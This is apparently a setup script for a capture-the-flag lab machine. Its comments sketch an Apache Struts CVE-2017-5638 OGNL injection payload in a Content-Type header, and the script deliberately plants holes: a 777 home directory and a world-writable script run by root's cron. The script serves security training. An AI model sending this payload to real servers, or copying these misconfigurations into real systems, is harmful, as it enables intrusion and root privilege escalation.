#!/bin/bash
# CVE-2017-5638: Apache Struts 2.5.10 OGNL injection via Content-Type
# Foothold: RCE as root (Tomcat runs as root in this image)
# Exploit: Send malicious Content-Type header to trigger OGNL expression eval
# Target: POST /struts2-showcase/fileupload/doUpload.action
#
# PoC Content-Type:
#   %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
#   (#_memberAccess?(#_memberAccess=#dm):(BYPASS_SNIPPET)).
#   (#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
#   (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
#   (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
#   (#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).
#   (#ros)}
#
# Privesc: Tomcat likely runs as root → direct flag write
# For realism, add sudo rule so tomcat user can become ckplayer

# Create tomcat-specific user for realism if Tomcat runs as non-root
id tomcat &>/dev/null || useradd -r -s /bin/false -M tomcat

# Allow root (Tomcat's effective user) to write to ckplayer's directory
chmod 777 /home/ckplayer
chmod 644 /home/ckplayer/user.txt

# Add writable crontab for lateral movement practice
echo "* * * * * root /opt/run.sh" > /etc/cron.d/maintenance
cat > /opt/run.sh << 'EOF'
#!/bin/bash
# maintenance script
date >> /tmp/health.log
EOF
chmod 777 /opt/run.sh
chmod 644 /etc/cron.d/maintenance
